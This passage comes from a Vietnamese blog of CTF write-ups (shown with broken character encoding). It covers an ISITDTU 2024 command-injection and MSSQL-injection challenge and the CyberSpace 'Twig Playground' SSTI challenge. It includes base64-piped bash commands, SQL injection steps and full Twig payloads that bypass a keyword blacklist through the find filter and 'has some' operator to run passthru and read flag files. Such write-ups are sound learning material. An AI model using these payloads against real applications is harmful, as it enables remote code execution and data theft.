má»¥c: /tmp/tomcat-docbase.8080...., má»—i láº§n deploy thÃ¬ giÃ¡ trá»‹ Ä‘áº±ng sau sáº½ lÃ  cÃ¡c kÃ½ tá»± khÃ¡c, nhÆ°ng prefix Ä‘áº±ng trÆ°á»›c sáº½ luÃ´n lÃ  tomcat-docbase.8080.. MÃ¬nh thá»­ echo ná»™i dung vÃ o 1 file trong Ä‘Ã³: Ná»™i dung file Ä‘Æ°á»£c hiá»‡n lÃªn webroot: NhÆ° váº­y thÃ¬ mÃ¬nh cÃ³ thá»ƒ láº¥y ná»™i dung flag thÃ´ng qua folder nÃ y, vÃ  trong Runtime.exec vÃ¬ táº¡i method nÃ y Java sáº½ coi cÃ¡c argument cá»§a command cÃ¡ch nhau bá»Ÿi dáº¥u cÃ¡ch, nÃªn Ä‘á»ƒ thuáº­n lá»£i trong viá»‡c sá»­ command thÃ¬ mÃ¬nh sá»­ dá»¥ng:\n1 bash -c {echo,base64command}|{base64,-d}|{bash,-i} Flag Ä‘Æ°á»£c Ä‘Æ°a vÃ o thÆ° má»¥c /app, nÃªn mÃ¬nh sáº½ ls Ä‘á»ƒ láº¥y tÃªn file trÆ°á»›c: MÃ¬nh cd vÃ o thÆ° má»¥c Ä‘Ã³ trÆ°á»›c rá»“i láº¥y oputput vÃ o file 13373269.txt á»p vÃ o Ä‘oáº¡n code gen cá»§a mÃ¬nh vÃ  send, káº¿t quáº£ mÃ¬nh cÃ³ flag tÃªn lÃ  eg5mhk3q9yp3: Giá» thÃ¬ chá»‰ viá»‡c lÃ m Ä‘iá»u tÆ°Æ¡ng tá»± vá»›i cat file thÃ´i lÃ  mÃ¬nh cÃ³ flag trÃªn local: Ãp dá»¥ng lÃªn server, mÃ¬nh cÃ³ tÃªn flag lÃ  m62dyeu1gr3t: Solve :heavy_check_mark: Flag: ISITDTU{We1come_t0_1s1tDTU_CTF} Hero Má»™t challenge blackbox mÃ  khi truy cáº­p Ä‘áº¿n cÃ³ Ä‘á»™c má»—i chá»©c nÄƒng Ä‘Äƒng ká»¹ vÃ  Ä‘Äƒng nháº­p: MÃ¬nh login vá»›i credential a:a, thÃ¬ cÃ³ 3 endpoint trang web cung cáº¥p:\n/heroes /genZ /old_heroes Äáº§u tiÃªn mÃ¬nh nghÄ© cÃ³ thá»ƒ SQLi táº¡i /genZ nhÆ°ng fuzz má»™t há»“i khÃ´ng cÃ³ gÃ¬ tiáº¿n triá»ƒn ngoÃ i or 1=1 thÃ¬ mÃ¬nh chuyá»ƒn qua endpoint /old_heroes, táº¡i Ä‘Ã¢y cÃ³ param name mÃ  khi truyá»n chuá»—i thÃ´ng thÆ°á»ng sáº½ thÃ´ng bÃ¡o lá»—i: Invalid object name 'OldHeroDB..' KhÃ¡ láº¡ vá»›i kiá»ƒu response nÃ y, mÃ¬nh tiáº¿p tá»¥c fuzzing vÃ  truyá»n dáº¥u nhÃ¡y cÃ¡c kiá»ƒu thÃ¬ nháº­n Ä‘Æ°á»£c kiá»ƒu lá»—i khÃ¡c nhau, má»—i lá»—i láº¡i vÄƒng ra má»™t Ã­t pháº§n cÃ¢u lá»‡nh SQL: Tá»« Ä‘Ã³ thÃ¬ mÃ¬nh tháº¥y payload Ä‘ang Ä‘Æ°á»£c truyá»n vÃ o nhiá»u hÆ¡n 1 chá»— trong cÃ¢u lá»‡nh SQL, nÃ´m na cÃ¢u lá»‡nh SQL sáº½ dáº¡ng dáº¡ng nhÆ° nÃ y (mÃ¬nh Ä‘oÃ¡n váº­y):\n1 payload.* FROM OldHeroDB..payload WHERE OldHeroDB..payload.Id = 1 MÃ¬nh Ä‘Ã£ cá»‘ thá»­ stacked query hoáº·c declare thÃªm biáº¿n Ä‘á»ƒ cháº¡y xp_cmdshell vÃ o pháº§n WHERE cuá»‘i nhÆ°ng lÃ m nhÆ° váº­y sáº½ lá»—i á»Ÿ pháº§n payload trÃªn, káº¿t quáº£ Ä‘á»u khÃ´ng giÃ²n Äi tÃ¬m kiáº¿m cÃ¡c tÃ i liá»‡u vá» mssql injection, mÃ¬nh tÃ¬m tháº¥y má»™t blog khai thÃ¡c vá»›i cÃ¡i kiá»ƒu db vá»›i 2 dáº¥u cháº¥m Ä‘áº±ng sau ráº¥t giá»‘ng vá»›i challenge: https://cyku.tw/no-database-mssql-injection/ Tá»« blog trÃªn mÃ¬nh rÃºt ra Ä‘Æ°á»£c vÃ i thá»©:\nKhÃ´ng thá»ƒ stacked query Thá»±c cháº¥t khÃ´ng cÃ³ database nÃ o cÃ³ tÃªn lÃ  OldHeroDB cáº£ MSSQL sáº½ loáº¡i bá» cÃ¡c dáº¥u cÃ¡ch trong quÃ¡ trÃ¬nh xá»­ lÃ½ tÃªn cá»™t -\u0026gt; cÃ³ thá»ƒ táº¡o tÃªn cá»™t vá»›i giÃ¡ trá»‹ null náº¿u nhÆ° truyá»n gÃ¡n vÃ o nÃ³ giÃ¡ trá»‹ cá»§a subquery select 1 as [ ] NhÆ° váº­y, ta Ä‘Ã£ cÃ³ thá»ƒ craft thÃ nh payload SQL Injection, Ä‘á»ƒ trÃ¡nh gáº·p lá»—i call methods on int ta sáº½ dÃ¹ng cÃ¡c properties vÃ  objects cÃ³ sáºµn trong MSSQL, mÃ  trong blogs sá»­ dá»¥ng lÃ  STY cá»§a data type geometry -\u0026gt; tráº£ vá» kiá»ƒu float Tá»« response cá»§a server, ta cÃ³ Ä‘Æ°á»£c 3 cá»™t cá»§a báº£ng lÃ  id, hero_name vÃ  hero_power. Äáº·c biá»‡t trong Ä‘Ã³ cá»™t hero_name cÃ³ thá»ƒ chá»©a chuá»—i. Theo blog thÃ¬ payload cÃ³ thá»ƒ attack kiá»ƒu Union based nÃªn mÃ¬nh cÅ©ng nhÃ³m thÃªm union select vÃ  káº¿t quáº£ show ra thÃ´ng tin, tiá»‡n cho mÃ¬nh Ä‘á»ƒ dump db: CÃ´ng viá»‡c gáº§n nhÆ° Ä‘Ã£ xong, giá» mÃ¬nh sáº½ Ä‘i mÃ² xem flag á»Ÿ Ä‘Ã¢u, náº¿u nhÆ° khÃ´ng cho dÃ¹ng xp_cmdshell Ä‘á»ƒ RCE thÃ¬ cháº¯c flag sáº½ náº±m á»Ÿ 1 báº£ng nÃ o Ä‘Ã³. XÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c báº£ng flags: XÃ¡c Ä‘á»‹nh cá»™t cá»§a báº£ng flags lÃ  flag_value: Solve :heavy_check_mark: Flag: ISITDTU{R3g4in_m0t1vation_w1th_s1mpl3_SQL1} ","date":"2024-10-27T17:10:08Z","permalink":"https://kev1n1203.github.io/p/isitdtu-ctf-2024/","title":"ISITDTU CTF 2024"},{"content":"Trong giáº£i CyberSpace nÃ y thÃ¬ team mÃ¬nh Ä‘Ã£ Ä‘áº¡t thá»© háº¡ng khÃ¡ cao lÃ  top 2. NÃ³i riÃªng vá» máº£ng web thÃ¬ team mÃ¬nh cÃ²n 1 bÃ i web logic lÃ  khÃ´ng ká»‹p lÃ m, cÃ¡ nhÃ¢n mÃ¬nh khÃ´ng tá»± solve Ä‘Æ°á»£c bÃ i nÃ o cáº£, vÃ  bÃ i Twig Playgound lÃ  challenge mÃ  mÃ¬nh tá»‘n nhiá»u thá»i gian Ä‘á»ƒ lÃ m nháº¥t (nhÆ°ng váº«n khÃ´ng solve Ä‘Æ°á»£c) Khi merge láº¡i Ä‘á»ƒ chÆ¡i chung thÃ¬ Ä‘iá»ƒm lá»£i sáº½ lÃ  mÃ¬nh Ä‘Æ°á»£c trao Ä‘á»•i, há»c há»i kiáº¿n thá»©c cá»§a nhá»¯ng teammates khÃ¡c. Tá»« Ä‘Ã³ giáº£m thiá»ƒu viá»‡c mÃ¬nh lÃºn quÃ¡ sÃ¢u vÃ o cÃ¡c rabbithole hoáº·c Ä‘i sai hÆ°á»›ng. NhÆ°ng nÃ³ Ä‘Ã£ háº¡i mÃ¬nh khÃ¡ nhiá»u vÃ¬ táº¡o cho mÃ¬nh thÃ³i quen xem hÆ°á»›ng cá»§a anh em trÆ°á»›c, khiáº¿n viá»‡c spot vuln vÃ  hÃ m lá»—i cá»§a mÃ¬nh trá»Ÿ nÃªn ráº¥t kÃ©m. Äiá»u nÃ y mÃ¬nh Ä‘Ã£ vÃ  Ä‘ang cá»‘ gáº¯ng kháº¯c phá»¥c, káº¿t quáº£ giáº£i nÃ y cho tháº¥y quÃ¡ trÃ¬nh nÃ y váº«n cÃ²n ráº¥t dÃ i khi mÃ¬nh váº«n chÆ°a thá»ƒ tá»± mÃ¬nh lÃ m Ä‘Æ°á»£c 1 challenge nÃ o má»™t cÃ¡ch háº³n hoi. MÃ¬nh viáº¿t láº¡i write up nÃ y cÅ©ng chá»‰ chia sáº» láº¡i gÃ³c nhÃ¬n cá»§a mÃ¬nh vá» challenge, cÅ©ng nhÆ° nhá»¯ng kiáº¿n thá»©c mÃ¬nh há»c Ä‘Æ°á»£c vÃ¬ mÃ¬nh áº¥n tÆ°á»£ng nháº¥t vÃ  tháº¥y bÃ i nÃ y khÃ¡ hay. ThÃ´i khÃ´ng dÃ i dÃ²ng ná»¯a, báº¯t Ä‘áº§u thÃ´i!\nPreface Äá» bÃ i ráº¥t straightforward, lÃ  má»™t website Ä‘á»ƒ render Twig template online, thÃ¬ mÃ¬nh cÅ©ng hiá»ƒu Ä‘Æ°á»£c lÃ  pháº£i khai thÃ¡c lá»—i SSTI táº¡i challenge nÃ y.\nSource Code Analysis Dockerfile 1 2 COPY ./flag /flag RUN mv /flag /flag-$(head -c 30 /dev/urandom | xxd -p | tr -dc \u0026#39;a-f\u0026#39; | head -c 10) Flag Ä‘Æ°á»£c move vÃ o / vÃ  Ä‘á»•i tÃªn, yÃªu cáº§u Ä‘Æ°a ra cháº¯c cháº¯n lÃ  RCE\nIndex.php Source cá»§a challenge ráº¥t Ä‘Æ¡n giáº£n, Ä‘Æ°a tháº³ng input cá»§a user vÃ o template Ä‘á»ƒ render, nhÆ°ng Ä‘iá»u mÃ¬nh chÃº Ã½ lÃ  cÃ¡i Ä‘á»‘ng blacklist nÃ y lÃ  quÃ¡ Ä‘á»§ Ä‘á»ƒ Ä‘Ã¡ háº¿t cÃ¡c payload cá»§a Hacktrick vÃ  PayloadAllTheThings ra chuá»“ng gÃ \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 $loader = new \\Twig\\Loader\\ArrayLoader([]); $twig = new \\Twig\\Environment($loader, [ \u0026#39;debug\u0026#39; =\u0026gt; true, ]); $twig-\u0026gt;addExtension(new \\Twig\\Extension\\DebugExtension()); $context = [ \u0026#39;user\u0026#39; =\u0026gt; [ \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;Wesley\u0026#39;, \u0026#39;age\u0026#39; =\u0026gt; 30, ], \u0026#39;items\u0026#39; =\u0026gt; [\u0026#39;Apple\u0026#39;, \u0026#39;Banana\u0026#39;, \u0026#39;Cherry\u0026#39;, \u0026#39;Dragonfruit\u0026#39;], ]; // Ensure no SSTI or RCE vulnerabilities $blacklist = [\u0026#39;system\u0026#39;, \u0026#39;id\u0026#39;, \u0026#39;passthru\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;shell_exec\u0026#39;, \u0026#39;popen\u0026#39;, \u0026#39;proc_open\u0026#39;, \u0026#39;pcntl_exec\u0026#39;, \u0026#39;_self\u0026#39;, \u0026#39;reduce\u0026#39;, \u0026#39;env\u0026#39;, \u0026#39;sort\u0026#39;, \u0026#39;map\u0026#39;, \u0026#39;filter\u0026#39;, \u0026#39;replace\u0026#39;, \u0026#39;encoding\u0026#39;, \u0026#39;include\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;run\u0026#39;, \u0026#39;Closure\u0026#39;, \u0026#39;Callable\u0026#39;, \u0026#39;Process\u0026#39;, \u0026#39;Symfony\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;.\u0026#39;, \u0026#39;;\u0026#39;, \u0026#39;[\u0026#39;, \u0026#39;]\u0026#39;, \u0026#39;\\\\\u0026#39;, \u0026#39;/\u0026#39;, \u0026#39;-\u0026#39;]; $templateContent = $_POST[\u0026#39;input\u0026#39;] ?? \u0026#39;\u0026#39;; foreach ($blacklist as $item) { if (stripos($templateContent, $item) !== false) { die(\u0026#34;Error: The input contains forbidden content: \u0026#39;$item\u0026#39;\u0026#34;); } } try { $template = $twig-\u0026gt;createTemplate($templateContent); $result = $template-\u0026gt;render($context); echo \u0026#39;\u0026lt;h2\u0026gt;Rendered Output:\u0026lt;/h2\u0026gt;\u0026#39;; echo \u0026#39;\u0026lt;div class=\u0026#34;output\u0026#34;\u0026gt;\u0026#39;; echo htmlspecialchars($result); // Ensure no XSS vulnerabilities echo \u0026#39;\u0026lt;/div\u0026gt;\u0026#39;; } catch(Exception $e) { echo \u0026#39;\u0026lt;div class=\u0026#34;error\u0026#34;\u0026gt;Something went wrong! Try again.\u0026lt;/div\u0026gt;\u0026#39;; } NgoÃ i ra táº¡i Ä‘Ã¢y mÃ¬nh tháº¥y há» báº­t cáº£ DebugExtension(), thÃ¬ mÃ¬nh cÃ³ thá»ƒ sá»­ dá»¥ng hÃ m dump() cÃ³ tÃ¡c dá»¥ng nhÆ° hÃ m var_dump() trong PHP chuyÃªn dÃ¹ng Ä‘á»ƒ xem dá»¯ liá»‡u Ä‘áº§u ra. Táº¡i Ä‘Ã¢y thÃ¬ mÃ¬nh cÃ³ thá»ƒ dump má»™t sá»‘ thÃ´ng tin cÃ³ trong template hiá»‡n táº¡i nhÆ° _self(Ä‘Ã£ bá»‹ cáº¥m), _context, _charset,... Vá»›i Twig template thÃ¬ viá»‡c khai thÃ¡c SSTI chá»§ yáº¿u phá»¥ thuá»™c vÃ o cÆ¡ cháº¿ filter data cá»§a Twig cho phÃ©p biáº¿n Ä‘á»•i dá»¯ liá»‡u tÃ¹y theo má»¥c Ä‘Ã­ch sá»­ dá»¥ng template. Dá»¯ liá»‡u Ä‘i qua filter thÃ´ng qua dáº¥u |, vÃ­ dá»¥ {{data|filter(args..)}}. Má»™t sá»‘ filter thÃ´ng dá»¥ng lÃ  slice, upper, lower, join. NhÆ°ng bÃªn cáº¡nh Ä‘Ã³ cÃ³ má»™t sá»‘ filter phá»• biáº¿n bá»Ÿi cÃ³ thá»ƒ lá»£i dá»¥ng nÃ³ Ä‘á»ƒ RCE, Ä‘iá»ƒm chung cá»§a cÃ¡c filter nÃ y lÃ  chuyÃªn dÃ¹ng Ä‘á»ƒ xá»­ lÃ½ máº£ng, vÃ  mÃ¬nh cÃ³ thá»ƒ truyá»n vÃ o má»™t hÃ m mÅ©i tÃªn cá»¥ thá»ƒ Ä‘á»ƒ tÃ¹y biáº¿n quÃ¡ trÃ¬nh xá»­ lÃ½ dá»¯ liá»‡u theo Ã½ mÃ¬nh thÃ­ch biá»ƒu diá»…n báº±ng hÃ m mÅ©i tÃªn. LÃºc nÃ y mÃ¬nh cÃ³ thá»ƒ truyá»n vÃ o hÃ m lÃ  má»™t system function Ä‘á»ƒ thá»±c thi cÃ¡c cÃ¢u lá»‡nh, cÃ²n data sáº½ lÃ  command, tá»« Ä‘Ã³ ta má»›i cÃ³ cÃ¡c payload SSTI trÃªn HackTrick sáº½ tá»± tá»±a nhe kiá»ƒu:\n1 {{[\u0026#34;id\u0026#34;]|filter(\u0026#34;system\u0026#34;)}} NgoÃ i ra cÃ³ thá»ƒ ká»ƒ Ä‘áº¿n cÃ¡c filter nhÆ°: map, sort, filter, reduce -\u0026gt; Ä‘á»u Ä‘Ã£ bá»‹ cáº¥m háº¿t. Táº¥t nhiÃªn, vá»›i Ä‘á»‘ng blacklist kia thÃ¬ máº¥y payload nhÆ° nÃ y khÃ´ng hoáº¡t Ä‘á»™ng. NÃªn mÃ¬nh Ä‘Ã£ Ä‘i tÃ¬m cÃ¡ch Ä‘á»ƒ craft Ä‘Æ°á»£c payload nhÆ° tháº¿ nÃ y, nhÆ°ng viá»‡c khai bÃ¡o string vá»›i máº£ng lÃ  khÃ´ng thá»ƒ vÃ¬ chall cÅ©ng Ä‘Ã£ cáº¥m dáº¥u ngoáº·c vuÃ´ng lÃ  2 kiá»ƒu nhÃ¡y. Äiá»u nÃ y lÃ m mÃ¬nh báº¿ táº¯c trong 1 khoáº£ng thá»i gian dÃ i mÃ  khÃ´ng tÃ¬m Ä‘Æ°á»£c cÃ¡ch nÃ o, nÃ³ lÃ m mÃ¬nh mÃ´ng lung khÃ´ng xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c trá»ng tÃ¢m cáº§n pháº£i lÃ m nhá»¯ng gÃ¬ Ä‘á»ƒ RCE Ä‘Æ°á»£c challenge nÃ y. Sau khi teammate tÃ¬m ra Ä‘Æ°á»£c cÃ¡ch Ä‘á»ƒ ná»‘i chuá»—i lÃ  sá»­ dá»¥ng dump() vÃ  ghÃ©p cÃ¡c kÃ½ tá»± trong Ä‘áº¥y Ä‘á»ƒ thÃ nh chuá»—i, mÃ¬nh má»›i xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c 2 bÆ°á»›c cáº§n lÃ m Ä‘á»ƒ solve challenge:\nTÃ¬m Ä‘Æ°á»£c cÃ¡ch ná»‘i chuá»—i cÃ¡c kÃ½ tá»± tÃ¹y Ã½ Ä‘á»ƒ khÃ´ng phá»¥ thuá»™c vÃ o context do context giá»›i háº¡n sá»‘ lÆ°á»£ng tá»« ngá»¯. TÃ¬m filter cÃ³ tÃ¡c dá»¥ng RCE tÆ°Æ¡ng tá»± nhÆ° cÃ¡c filter Ä‘Ã£ bá»‹ blacklist Bypass Craft String in Twig using {% set \u0026hellip; %} Vá»›i viá»‡c cáº¥m táº¥t cáº£ dáº¥u nhÃ¡y, viá»‡c khai bÃ¡o má»™t string hay array cÆ¡ báº£n lÃ  khÃ´ng thá»ƒ. Tuy nhiÃªn ta cÃ³ thá»ƒ dá»¥ng dáº¥u ~ Ä‘á»ƒ ná»‘i chuá»—i cÃ¡c string vá»›i nhau hoáº·c cÃ¡c biáº¿n vá»›i nhau. NÃªn Ã½ tÆ°á»Ÿng ban Ä‘áº§u lÃ  sá»­ dump() -\u0026gt; var_dump ra context hiá»‡n táº¡i, dÃ¹ng slice Ä‘á»ƒ láº¥y tá»«ng kÃ½ tá»± trong chuá»—i tráº£ ra vÃ  ná»‘i chÃºng láº¡i vá»›i nhau thÃ nh chuá»—i. Vá»›i cÃ¡ch nÃ y ta cÃ³ thá»ƒ táº¡o thÃ nh string, tuy nhiÃªn bá»‹ giá»›i háº¡n vá» máº·t tá»« ngá»¯, vÃ  viá»‡c ghÃ©p tá»«ng kÃ½ tá»± theo sá»‘ nhÆ° nÃ y ráº¥t má»‡t, nháº¥t lÃ  viá»‡c flag cÃ³ nhiá»u kÃ½ tá»± nhÆ° kia mÃ  ta khÃ´ng cÃ³ kÃ½ tá»± * thÃ¬ ná»‘i Ä‘áº¿n cháº¿t :skull: Thay vÃ¬ láº¥y tá»« dump, ta cÃ³ thá»ƒ sá»­ dá»¥ng {} Ä‘á»ƒ má»™t tham sá»‘ thÃ nh máº£ng, nÆ¡i giÃ¡ trá»‹ cá»§a tham sá»‘ lÃ  value cá»§a nÃ³: Káº¿t há»£p nÃ³ vá»›i dump thÃ¬ ta cÃ³: TÃªn tham sá»‘ sytem Ä‘Æ°á»£c Ä‘Æ°a vÃ o máº£ng, vá»›i giÃ¡ trá»‹ tÆ°Æ¡ng á»©ng lÃ  giÃ¡ trá»‹ cá»§a tham sá»‘ sytem vÃ  = NULL -\u0026gt; slice máº£ng nÃ y sáº½ dá»… hÆ¡n slice tá»«ng kÃ­ tá»± má»™t khi sá»­ dá»¥ng dump() Váº­y lÃ  ta cÃ³ thá»ƒ craft ra cÃ¡c kÃ½ tá»± rá»“i, nhÆ°ng flag náº±m á»Ÿ / vÃ  flag cÅ©ng chá»©a dáº¥u - thÃ¬ ta pháº£i xá»­ lÃ½ nhÆ° tháº¿ nÃ o. Khi _context khÃ´ng chá»©a dáº¥u / vÃ  náº¿u ta cÅ©ng khÃ´ng thá»ƒ Ä‘Æ°a dáº¥u * vÃ o bÃªn trong dump({}) vÃ¬ nhÆ° tháº¿ sáº½ lá»—i ngay: Váº­y nhiá»‡m vá»¥ tiáº¿p theo lÃ  cáº§n dáº¥u / vÃ  dáº¥u - báº±ng cÃ¡ch tiáº¿p tá»¥c sá»­ dá»¥ng dump() Vá»›i dáº¥u - thÃ¬ trong _charset ta sáº½ tháº¥y cÃ³ xuáº¥t hiá»‡n dáº¥u Ä‘Ã³ náº±m trong chuá»—i UTF-8. Ta láº¥y kÃ½ tá»± thá»© 4, tÆ°Æ¡ng á»©ng vá»›i slice(3,1) vÃ¬ vá»‹ trÃ­ string báº¯t Ä‘áº§u Ä‘áº¿m tá»« 0 Ä‘á»ƒ láº¥y dáº¥u - ra:\n1 {% set hyphen = _charset|slice(3,1) %} CÃ²n dáº¥u / thÃ¬ ta cÃ³ thá»ƒ láº¥y kÃ½ tá»± xuá»‘ng dÃ²ng (sáº½ xuáº¥t hiá»‡n khi dump) sau Ä‘Ã³ thÃªm filter nl2br Ä‘á»ƒ chuyá»ƒn kÃ½ tá»± xuá»‘ng dÃ²ng thÃ nh tháº» HTML \u0026lt;br/\u0026gt;, tiáº¿p tá»¥c sá»­ dá»¥ng filter raw Ä‘á»ƒ giá»¯ nguyÃªn tháº» khÃ´ng bá»‹ html encode, rá»“i slice láº¥y dáº¥u / bÃªn trong tháº» br:\n1 {% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %} NgoÃ i cÃ¡ch sá»­ dá»¥ng {}, ta cÅ©ng cÃ³ thá»ƒ sá»­ dá»¥ng filter split chuá»—i Ä‘áº§u vÃ o vá»›i kÃ½ tá»± khÃ´ng tá»“n táº¡i trong chuá»—i Ä‘á»ƒ chuyá»ƒn chuá»—i thÃ nh máº£ng, vÃ¬ cÃ´ng dá»¥ng cá»§a split lÃ  chia chuá»—i thÃ nh máº£ng cÃ¡c pháº§n tá»­ theo kÃ½ tá»± xÃ¡c Ä‘á»‹nh Find Twig filters to RCE find CÃ´ng cá»¥ Ä‘Ã£ cÃ³ Ä‘á»§ cáº£, giá» thá»© mÃ¬nh vÃ  Ä‘á»“ng Ä‘á»™i Ä‘Ã£ stuck ráº¥t lÃ¢u má»›i tÃ¬m ra, Ä‘Ã³ lÃ  filters phÃ¹ há»£p Ä‘á»ƒ cÃ³ thá»ƒ RCE. Biáº¿t Ä‘Æ°á»£c phiÃªn báº£n Twig Ä‘ang sá»­ dá»¥ng lÃ  3.12, mÃ¬nh tÃ¬m kiáº¿m nhÆ°ng káº¿t quáº£ no hope, cÃ y háº¿t cÃ¡i doc cÃ¡c filters cá»§a Twig thÃ¬ toÃ n cÃ¡i khÃ´ng dÃ¹ng Ä‘Æ°á»£c, nhá»¯ng cÃ¡i dÃ¹ng Ä‘Æ°á»£c Ä‘á»u bá»‹ blacklist háº¿t. BÃ­ ngÃ²i cáº£ 1 ngÃ y thÃ¬ teammate tÃ¬m ra filter find cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ RCE: Vá» cÃ¡ch sá»­ dá»¥ng thÃ¬ y chang cÃ¡c filter Ä‘Ã£ bá»‹ blacklist, tá»± há»i táº¡i sao nÃ³ khÃ´ng á»Ÿ trong doc thÃ¬ cÃ³ láº½ doc upadte chÆ°a tá»›i do filter nÃ y má»›i Ä‘Æ°á»£c thÃªm vÃ o táº¡i phiÃªn báº£n 3.11: Filter nÃ y náº±m táº¡i file /Twig/src/Extension/CoreExtension.php, lÃ  má»™t trong cÃ¡c filter cÃ³ sáºµn cá»§a Twig, Ä‘oáº¡n code xá»­ lÃ½ filter nÃ y sáº½ nhÆ° sau:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 public function getFilters(): array { ... // array helpers new TwigFilter(\u0026#39;find\u0026#39;, [self::class, \u0026#39;find\u0026#39;], [\u0026#39;needs_environment\u0026#39; =\u0026gt; true]), ... } /** * @internal */ public static function find(Environment $env, $array, $arrow) { self::checkArrowInSandbox($env, $arrow, \u0026#39;find\u0026#39;, \u0026#39;filter\u0026#39;); foreach ($array as $k =\u0026gt; $v) { if ($arrow($v, $k)) { return $v; } } return null; } Vá» cÆ¡ báº£n, ta truyá»n vÃ o hÃ m file máº£ng Ä‘á»ƒ xá»­ lÃ½ -\u0026gt; $array vÃ  tÃªn hÃ m mÅ©i tÃªn custom Ä‘i kÃ¨m -\u0026gt; $arrow. HÃ m sáº½ Ä‘i duyá»‡t tá»«ng pháº§n tá»­ trong máº£ng, sá»‘ thá»© tá»± pháº§n tá»­ máº£ng lÆ°u vÃ o biáº¿n $k, ná»™i dung cá»§a pháº§n tá»­ Ä‘Ã³ lÆ°u vÃ o biáº¿n $v. Biáº¿n $array lÃºc nÃ y sáº½ Ä‘Æ°á»£c Ä‘Æ°a vÃ o lÃ m tÃªn hÃ m, vá»›i 2 tham sá»‘ truyá»n vÃ o láº§n lÆ°á»£t lÃ  ná»™i dung pháº§n tá»­ vÃ  thá»© tá»± cá»§a pháº§n tá»­ Ä‘Ã³. Vá»«a hay lÃ  ta cÃ³ thá»ƒ truyá»n cÃ¡c tham sá»‘ tÆ°Æ¡ng tá»± nhÆ° váº­y vÃ o cÃ¡c hÃ m thá»±c thi cÃ¢u lá»‡nh nhÆ°: 1 2 3 4 system ( string $command [, int \u0026amp;$return_var ] ) : string passthru ( string $command [, int \u0026amp;$return_var ] ) exec ( string $command [, array \u0026amp;$output [, int \u0026amp;$return_var ]] ) : string shell_exec ( string $cmd ) : string Tá»« Ä‘Ã³, ta sáº½ truyá»n vÃ o $array giÃ¡ trá»‹ lÃ  system hoáº·c passthru, vÃ  truyá»n vÃ o ná»™i dung máº£ng lÃ  cÃ¢u lá»‡nh cáº§n thá»±c hiá»‡n. Khi Ä‘Ã³ sáº½ tÆ°Æ¡ng Ä‘Æ°Æ¡ng vá»›i viá»‡c thá»±c thi PHP Code:\n1 2 system($command, 0) passthru($command, 0) Äá»ƒ test thÃ¬ táº¡m thá»i mÃ¬nh comment láº¡i Ä‘oáº¡n check blacklist Ä‘á»ƒ run cho tiá»‡n: has some NgoÃ i filter find ra, mÃ¬nh Ä‘i lÆ°á»£n github thÃ¬ cÃ³ ngÆ°á»i cÃ²n tÃ¬m Ä‘Æ°á»£c operator has some cÅ©ng cÃ³ thá»ƒ Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ RCE, vá»›i nguyÃªn lÃ½ cÅ©ng tÆ°Æ¡ng tá»± find:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public function getOperators(): array { ... \u0026#39;has some\u0026#39; =\u0026gt; [\u0026#39;precedence\u0026#39; =\u0026gt; 20, \u0026#39;class\u0026#39; =\u0026gt; HasSomeBinary::class, \u0026#39;associativity\u0026#39; =\u0026gt; ExpressionParser::OPERATOR_LEFT], ... } /** * @internal */ public static function arraySome(Environment $env, $array, $arrow) { self::checkArrowInSandbox($env, $arrow, \u0026#39;has some\u0026#39;, \u0026#39;operator\u0026#39;); foreach ($array as $k =\u0026gt; $v) { if ($arrow($v, $k)) { return true; } } return false; } Ta váº«n cÃ³ thá»ƒ truyá»n vÃ o má»™t máº£ng vÃ  tÃªn hÃ m tÃ¹y Ã½, náº¿u nhÆ° hÃ m Ä‘Ã³ xá»­ lÃ½ Ä‘Æ°á»£c sáº½ tráº£ vá» true, cÃ²n khÃ´ng tráº£ vá» false. ÄÃ¢y lÃ  operator nÃªn ta khÃ´ng cáº§n sá»­ dá»¥ng dáº¥u | Ä‘á»ƒ apply filter mÃ  cÃ³ thá»ƒ viáº¿t tháº³ng nhÆ° sau:\n1 {{[\u0026#34;id\u0026#34;] has some \u0026#34;passthru\u0026#34;}} CÃ¡ch nÃ y khÃ¡ lá»d vÃ  cÃ³ láº½ mÃ¬nh sáº½ sá»­ dá»¥ng trong má»™t ctf challenge nÃ o Ä‘Ã³ =)))\nFinal Payload \u0026amp; Exploit Tá»•ng há»£p láº¡i Ä‘á»ƒ khai thÃ¡c, Ä‘áº§u tiÃªn mÃ¬nh craft payload ls / Ä‘á»ƒ Ä‘á»c flag trÆ°á»›c Ä‘Ã£, mÃ¬nh sá»­ dá»¥ng passthru thay cho system vÃ¬ Ä‘á»¡ pháº£i ná»‘i chuá»—i 3 phÃ¡t=))\n1 2 3 4 5 6 7 {% set ls = dump({ls})|slice(15,2) %} {% set pass = dump({pasthru})|slice(15,3)~dump({pasthru})|slice(17,5) %} {% set hyphen = _charset|slice(3,1) %} {% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %} {% set space = dump()|slice(8,1) %} {% set cmd = ls~space~slash %} {{ {cmd}|find(pass) }} MÃ¬nh cÃ³ Ä‘Æ°á»£c tÃªn flag lÃ : flag-efbeeaddce Giá» thÃ¬ craft cÃ¢u lá»‡nh Ä‘á»c flag thÃ´i:\n1 2 3 4 5 6 7 8 {% set cat = dump({cat})|slice(15,3) %} {% set pass = dump({pasthru})|slice(15,3)~dump({pasthru})|slice(17,5) %} {% set hyphen = _charset|slice(3,1) %} {% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %} {% set space = dump()|slice(8,1) %} {% set flag = dump({flag})|slice(15,4)~hyphen~dump({efbeeaddce})|slice(15,10) %} {% set cmd = cat~space~slash~flag %} {{ {cmd}|find(pass) }} TrÃªn server thÃ¬ flag cÃ³ tÃªn: flag-edbfcbcaef Flag: CSCTF{Tw1g_tw1g_ssT1_n0_h4cKtr1ck5_th1S_t1M3} 